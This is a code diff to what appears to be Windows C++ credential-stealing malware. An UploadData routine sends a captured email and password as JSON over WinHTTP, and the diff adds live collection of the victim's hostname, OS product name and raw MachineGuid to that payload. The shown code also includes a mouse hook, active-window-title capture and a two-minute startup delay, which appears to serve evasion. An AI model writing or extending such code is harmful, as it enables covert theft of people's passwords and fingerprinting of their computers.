@@ -13,6 +13,7 @@
 #pragma comment(lib, "winhttp.lib")
 #pragma comment(lib, "shell32.lib")
 #pragma comment(lib, "bcrypt.lib")
+#pragma comment(lib, "advapi32.lib") // Required for Registry and ComputerName
 
 // --- 1. JSON ESCAPING HELPER ---
 std::string EscapeJson(const std::string& s) {
@@ -35,30 +36,43 @@ std::string EscapeJson(const std::string& s) {
     return o.str();
 }
 
-// --- 2. SYSTEM METADATA (MATCHES YOUR DATABASE UUID) ---
+// --- 2. DYNAMIC METADATA HELPERS ---
+
 std::string GetMachineId() {
     char value[255];
     DWORD BufferSize = sizeof(value);
     HKEY hKey;
-    
-    // Open Registry to get MachineGuid
     LONG lRes = RegOpenKeyExA(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Cryptography", 0, KEY_READ | KEY_WOW64_64KEY, &hKey);
-    
     if (lRes == ERROR_SUCCESS) {
         lRes = RegQueryValueExA(hKey, "MachineGuid", NULL, NULL, (LPBYTE)value, &BufferSize);
         RegCloseKey(hKey);
-        
         if (lRes == ERROR_SUCCESS) {
             std::string rawId = value;
-            // Ensure lowercase to match standard UUID formatting
             std::transform(rawId.begin(), rawId.end(), rawId.begin(), [](unsigned char c){ return std::tolower(c); });
-            
-            // WE REMOVED SHA256 HERE. 
-            // This now returns the raw UUID: ef508dd1-092d-4d05-90ac-0b5338115bee
             return rawId;
         }
     }
     return "unknown_machine_id";
+}
+
+std::string GetDynamicHostname() {
+    char buffer[MAX_COMPUTERNAME_LENGTH + 1];
+    DWORD size = sizeof(buffer);
+    if (GetComputerNameA(buffer, &size)) return std::string(buffer);
+    return "Unknown-Host";
+}
+
+std::string GetDynamicOS() {
+    char value[255] = {0};
+    DWORD BufferSize = sizeof(value);
+    HKEY hKey;
+    // Reading from registry is the most accurate way to get the "Product Name" (e.g. Windows 11 Pro)
+    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion", 0, KEY_READ | KEY_WOW64_64KEY, &hKey) == ERROR_SUCCESS) {
+        RegQueryValueExA(hKey, "ProductName", NULL, NULL, (LPBYTE)value, &BufferSize);
+        RegCloseKey(hKey);
+        return std::string(value);
+    }
+    return "Windows (Unknown Version)";
 }
 
 std::string GetActiveWindowTitle() {
@@ -102,8 +116,8 @@ void UploadData(std::string email, std::string pass) {
        <<     "\"password\": \"" << EscapeJson(pass) << "\""
        << "},"
        << "\"systemMeta\": {"
-       <<     "\"os\": \"Windows 10/11\","
-       <<     "\"hostname\": \"DESKTOP-UA7UT44\""
+       <<     "\"os\": \"" << EscapeJson(GetDynamicOS()) << "\","
+       <<     "\"hostname\": \"" << EscapeJson(GetDynamicHostname()) << "\""
        << "}"
        << "}";
 
@@ -201,7 +215,7 @@ LRESULT CALLBACK MouseProc(int n, WPARAM w, LPARAM l) {
 }
 
 int WINAPI WinMain(HINSTANCE h, HINSTANCE p, LPSTR c, int s) {
-     WriteDebug("=== STARTING SERVICE ===");
+    WriteDebug("=== STARTING SERVICE ===");
     WriteDebug("wait 2 minutes sleeping...");
     Sleep(120000); 
     WriteDebug("2 minutes passed ...");
